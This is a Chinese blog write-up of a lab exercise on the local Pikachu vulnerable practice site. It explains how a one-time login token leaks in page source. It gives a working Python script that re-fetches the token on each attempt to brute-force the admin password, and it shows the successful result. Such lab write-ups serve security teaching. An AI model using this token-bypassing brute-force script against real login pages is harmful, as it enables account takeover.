---
title: Pikachu 暴力破解 - token防爆破
date: 2026-10-24
categories: [Pikachu]
tags: [Pikachu, 暴力破解, token, burpsuite, web]
---

## 靶场地址
`http://127.0.0.1/pikachu/vul/burteforce/bf_token.php`

## 漏洞简介
登录表单增加一次性 token 防护，用来抵御简单的暴力破解。token 和会话绑定、单次使用失效；但 token 在页面源码明文返回，攻击者可以自动化获取新 token 持续爆破。

## 原理
后端每次登录校验 token，token 一次性生效，提交即销毁；但是 token 明文输出在页面源码，攻击者可以自动递归提取新 token，绕过该防护继续爆破。
- token 存放在 `hidden` 隐藏输入框
- token 绑定 `PHPSESSID`，跨会话token无效
- 提交一次登录后，当前token作废

## 踩坑：Burp Suite Community 限制
尝试使用 Burp Intruder + Pitchfork + Grep-Extract，想要使用 `Recursive grep` 自动回填 token。
> 问题：**Burp 社区版没有 Recursive grep 这个Payload类型，无法自动更新token**，此方案行不通。

## 利用思路
使用 Python 脚本，依靠 `requests.Session()` 维持同一个会话：
1. 每次尝试密码前，GET 请求页面，正则抓取最新 token
2. 带着本次拿到的 token + 账号密码 POST 提交登录
3. 判断返回页面是否包含登录成功标识

## EXP
python
import requests
import re

url = "http://127.0.0.1/pikachu/vul/burteforce/bf_token.php"
headers = {
    "User-Agent": "Mozilla/5.0"
}
s = requests.Session()
pwd_list = ["123456", "123123", "888888", "666666"]

for pwd in pwd_list:
    res_get = s.get(url, headers=headers)
    token = re.search(r'name="token" value="(.*?)"', res_get.text).group(1)
    data = {
        "username": "admin",
        "password": pwd,
        "token": token,
        "submit": "Login"
    }
    res_post = s.post(url, data=data, headers=headers)
    if "login success" in res_post.text:
        print(f"✅ 爆破成功！账号：admin，密码：{pwd}")
        break
    else:
        print(f"❌ 密码 {pwd} 错误")

### 运行结果
✅ 爆破成功！账号：admin，密码：123456

